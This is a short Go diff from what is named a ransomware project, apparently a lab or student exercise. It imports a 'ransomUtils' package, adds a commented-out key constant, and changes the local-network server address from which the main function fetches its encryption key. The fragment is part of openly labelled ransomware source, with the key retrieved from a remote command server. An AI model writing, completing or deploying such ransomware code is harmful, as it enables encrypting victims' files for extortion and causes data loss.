@@ -6,8 +6,10 @@ import (
 	"ransomware/ransomUtils"
 )
 
+//const key = "clave"
+
 func main() {
-	key, err := ransomUtils.obtenerClave("192.168.60.3:9090")
+	key, err := ransomUtils.obtenerClave("192.168.1.43:9090")
 	if err != nil {
 		fmt.Println("Error al obtener la palabra:", err)
 		return
